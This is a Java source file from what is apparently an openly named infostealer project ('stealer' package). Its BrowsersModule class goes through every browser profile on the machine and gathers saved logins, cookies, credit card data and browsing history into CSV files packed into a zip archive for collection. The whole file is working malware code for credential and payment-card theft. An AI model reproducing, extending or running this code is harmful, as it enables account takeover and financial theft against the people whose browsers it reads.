package com.github.shurpe.stealer.module;

import com.github.shurpe.stealer.utils.Utils;
import com.github.shurpe.stealer.utils.browser.Browser;
import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataCCs;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataCookies;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataHistory;
import com.github.shurpe.stealer.utils.browser.data.BrowserDataLogins;

import java.util.zip.ZipOutputStream;

public final class BrowsersModule extends Module {

	public static final BrowsersModule INSTANCE = new BrowsersModule();

	public void toOutput(final ZipOutputStream outputStream) {
		final StringBuilder loginsCsv = new StringBuilder(BrowserDataLogins.CSV_HEADER);
		final StringBuilder cookiesCsv = new StringBuilder(BrowserDataCookies.CSV_HEADER);
		final StringBuilder creditCardsCsv = new StringBuilder(BrowserDataCCs.CSV_HEADER);
		final StringBuilder historyCsv = new StringBuilder(BrowserDataHistory.CSV_HEADER);

		for (final Browser.Info info : Browser.Info.values()) {
			if (!info.getDataDirectory().isDirectory()) {
				continue;
			}

			final Browser browser = new Browser(info);
			final BrowserProfile[] browserProfiles = browser.getProfiles();

			if (browserProfiles == null) {
				return;
			}

			for (final BrowserProfile profile : browserProfiles) {
				loginsCsv.append(profile.getDataLogins().toCsvColumn());
				cookiesCsv.append(profile.getDataCookies().toCsvColumn());
				creditCardsCsv.append(profile.getDataCCs().toCsvColumn());
				historyCsv.append(profile.getDataHistory().toCsvColumn());
			}
		}

		Utils.writeZip(loginsCsv.toString(), "browsers/logins.csv", outputStream);
		Utils.writeZip(cookiesCsv.toString(), "browsers/cookies.csv", outputStream);
		Utils.writeZip(creditCardsCsv.toString(), "browsers/credit-cards.csv", outputStream);
		Utils.writeZip(historyCsv.toString(), "browsers/history.csv", outputStream);
	}
}